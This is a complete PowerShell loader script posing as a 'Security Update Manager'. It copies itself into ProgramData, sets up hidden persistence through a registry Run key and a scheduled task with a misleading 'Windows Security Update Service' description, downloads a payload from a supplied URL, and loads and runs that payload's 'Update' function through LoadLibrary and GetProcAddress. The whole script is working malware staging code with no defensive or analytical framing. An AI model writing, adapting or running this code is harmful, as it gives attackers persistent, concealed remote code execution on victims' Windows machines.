param(
    [Parameter(Mandatory=$true)]
    [string]$Url
)

# Configuration
$folderPath = "C:\ProgramData\SecurityUpdate"
$scriptCopyName = "secupdate.ps1"
$payloadName = "secupdate.bin"
$scriptCopyPath = Join-Path -Path $folderPath -ChildPath $scriptCopyName
$payloadPath = Join-Path -Path $folderPath -ChildPath $payloadName
$taskName = "SecurityUpdateTask"
$registryName = "SecurityUpdateService"
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Get current script path
$currentScriptPath = $PSCommandPath
if (-not $currentScriptPath) {
    Write-Error "Script must be run from a file, not from console"
    exit 1
}

Write-Host "`n================================" -ForegroundColor Yellow
Write-Host "Security Update Manager" -ForegroundColor Yellow
Write-Host "================================`n" -ForegroundColor Yellow

try {
    # Step 1: Create directory
    Write-Host "[*] Creating target directory..." -ForegroundColor Cyan
    if (-not (Test-Path -Path $folderPath)) {
        New-Item -ItemType Directory -Path $folderPath -Force | Out-Null
        Write-Host "[+] Directory created: $folderPath" -ForegroundColor Green
    } else {
        Write-Host "[*] Directory already exists: $folderPath" -ForegroundColor Yellow
    }
    
    # Step 2: Copy this script to the target directory
    Write-Host "`n[*] Copying script to target directory..." -ForegroundColor Cyan
    Write-Host "    Source: $currentScriptPath" -ForegroundColor Gray
    Write-Host "    Destination: $scriptCopyPath" -ForegroundColor Gray
    
    try {
        Copy-Item -Path $currentScriptPath -Destination $scriptCopyPath -Force
        Write-Host "[+] Script copied successfully" -ForegroundColor Green
    } catch {
        Write-Error "Failed to copy script: $_"
        exit 1
    }
    
    # Step 3: Check if persistence already exists
    Write-Host "`n[*] Checking for existing persistence..." -ForegroundColor Cyan
    
    $taskExists = $null -ne (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)
    $regExists = $null -ne (Get-ItemProperty -Path $registryPath -Name $registryName -ErrorAction SilentlyContinue)
    
    if ($taskExists -and $regExists) {
        Write-Host "[*] Persistence mechanisms already exist, skipping..." -ForegroundColor Yellow
    } else {
        Write-Host "[*] Creating persistence mechanisms..." -ForegroundColor Cyan
        
        # Build command to execute the COPIED script with URL parameter
        $executeCommand = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptCopyPath`" -Url `"$Url`""
        
        # Create registry Run key
        Write-Host "`n[*] Creating registry persistence..." -ForegroundColor Cyan
        try {
            Set-ItemProperty -Path $registryPath -Name $registryName -Value $executeCommand -Force
            Write-Host "[+] Registry key created" -ForegroundColor Green
            Write-Host "    Path: $registryPath" -ForegroundColor Gray
            Write-Host "    Name: $registryName" -ForegroundColor Gray
            Write-Host "    Command: $executeCommand" -ForegroundColor Gray
        } catch {
            Write-Warning "Failed to create registry key: $_"
        }
        
        # Create scheduled task
        Write-Host "`n[*] Creating scheduled task..." -ForegroundColor Cyan
        try {
            # Define action - execute the COPIED script
            $action = New-ScheduledTaskAction -Execute "powershell.exe" `
                -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptCopyPath`" -Url `"$Url`""
            
            # Define triggers
            $triggerDaily = New-ScheduledTaskTrigger -Daily -At 9am
            $triggerLogon = New-ScheduledTaskTrigger -AtLogOn
            
            # Define settings
            $settings = New-ScheduledTaskSettings `
                -AllowStartIfOnBatteries `
                -DontStopIfGoingOnBatteries `
                -StartWhenAvailable `
                -Hidden `
                -ExecutionTimeLimit (New-TimeSpan -Hours 1)
            
            # Define principal (run as current user)
            $principal = New-ScheduledTaskPrincipal `
                -UserId "$env:USERDOMAIN\$env:USERNAME" `
                -LogonType Interactive `
                -RunLevel Limited
            
            # Register the task
            Register-ScheduledTask `
                -TaskName $taskName `
                -Action $action `
                -Trigger $triggerDaily,$triggerLogon `
                -Settings $settings `
                -Principal $principal `
                -Description "Windows Security Update Service" `
                -Force | Out-Null
            
            Write-Host "[+] Scheduled task created" -ForegroundColor Green
            Write-Host "    Name: $taskName" -ForegroundColor Gray
            Write-Host "    Triggers: Daily at 9 AM + At user logon" -ForegroundColor Gray
            Write-Host "    Script: $scriptCopyPath" -ForegroundColor Gray
            
        } catch {
            Write-Warning "Failed to create scheduled task: $_"
        }
    }
    
    # Step 4: Download payload
    Write-Host "`n[*] Downloading payload..." -ForegroundColor Cyan
    Write-Host "    URL: $Url" -ForegroundColor Gray
    Write-Host "    Destination: $payloadPath" -ForegroundColor Gray
    
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($Url, $payloadPath)
        $webClient.Dispose()
        
        Write-Host "[+] Download completed successfully" -ForegroundColor Green
        
        # Verify and display file info
        if (Test-Path $payloadPath) {
            $fileInfo = Get-Item $payloadPath
            Write-Host "    File size: $($fileInfo.Length) bytes" -ForegroundColor Gray
            Write-Host "    Modified: $($fileInfo.LastWriteTime)" -ForegroundColor Gray
        }
        
    } catch {
        Write-Error "Download failed: $_"
        exit 1
    }

    # Step 5: Load and execute the 'Update' function from downloaded DLL
    Write-Host "`n[*] Loading and executing payload..." -ForegroundColor Cyan
    
    # Define Win32 API for LoadLibrary and GetProcAddress
    $loadLibraryCode = @"
using System;
using System.Runtime.InteropServices;

public class PayloadLoader {
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern IntPtr LoadLibrary(string lpFileName);
    
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool FreeLibrary(IntPtr hModule);
    
    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();
    
    // x64 uses single calling convention (Microsoft x64 ABI)
    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    public delegate void UpdateFunc();
}
"@
    
    try {
        Add-Type -TypeDefinition $loadLibraryCode -ErrorAction Stop
    } catch {
        # Type already exists, continue
    }
    
    # Load the DLL
    Write-Host "    Loading library: $payloadPath" -ForegroundColor Gray
    $hModule = [PayloadLoader]::LoadLibrary($payloadPath)
    
    if ($hModule -eq [IntPtr]::Zero) {
        $errorCode = [PayloadLoader]::GetLastError()
        Write-Warning "Failed to load library. Error code: $errorCode"
        Write-Host "[!] Payload execution skipped" -ForegroundColor Yellow
    } else {
        Write-Host "[+] Library loaded successfully" -ForegroundColor Green
        Write-Host "    Handle: 0x$($hModule.ToString('X'))" -ForegroundColor Gray
        
        # Get 'Update' function
        Write-Host "[*] Resolving function: Update" -ForegroundColor Cyan
        $funcPtr = [PayloadLoader]::GetProcAddress($hModule, "Update")
        
        if ($funcPtr -eq [IntPtr]::Zero) {
            $errorCode = [PayloadLoader]::GetLastError()
            Write-Warning "Function 'Update' not found in DLL. Error code: $errorCode"
        } else {
            Write-Host "[+] Function 'Update' found" -ForegroundColor Green
            Write-Host "    Address: 0x$($funcPtr.ToString('X'))" -ForegroundColor Gray
            
            # Execute the function (x64 ABI - single calling convention)
            Write-Host "[*] Executing function: Update" -ForegroundColor Cyan
            
            try {
                $delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
                    $funcPtr,
                    [PayloadLoader+UpdateFunc]
                )
                $delegate.Invoke()
                Write-Host "[+] Function executed successfully" -ForegroundColor Green
                
            } catch {
                Write-Error "Failed to execute function 'Update': $_"
            }
        }
        
        # Clean up - free the library
        Write-Host "`n[*] Unloading library..." -ForegroundColor Cyan
        $freed = [PayloadLoader]::FreeLibrary($hModule)
        
        if ($freed) {
            Write-Host "[+] Library unloaded successfully" -ForegroundColor Green
        } else {
            Write-Warning "Failed to unload library"
        }
    }
    
    # Summary
    Write-Host "`n================================" -ForegroundColor Yellow
    Write-Host "Installation Complete" -ForegroundColor Green
    Write-Host "================================" -ForegroundColor Yellow
    Write-Host "Script Copy: $scriptCopyPath" -ForegroundColor Cyan
    Write-Host "Payload: $payloadPath" -ForegroundColor Cyan
    Write-Host "`nPersistence Mechanisms:" -ForegroundColor Cyan
    Write-Host "  Registry: $registryPath\$registryName" -ForegroundColor Gray
    Write-Host "  Task: $taskName" -ForegroundColor Gray
    Write-Host "  Both execute: $scriptCopyPath" -ForegroundColor Gray
    Write-Host "================================`n" -ForegroundColor Yellow
    
} catch {
    Write-Error "Critical error occurred: $_"
    exit 1
}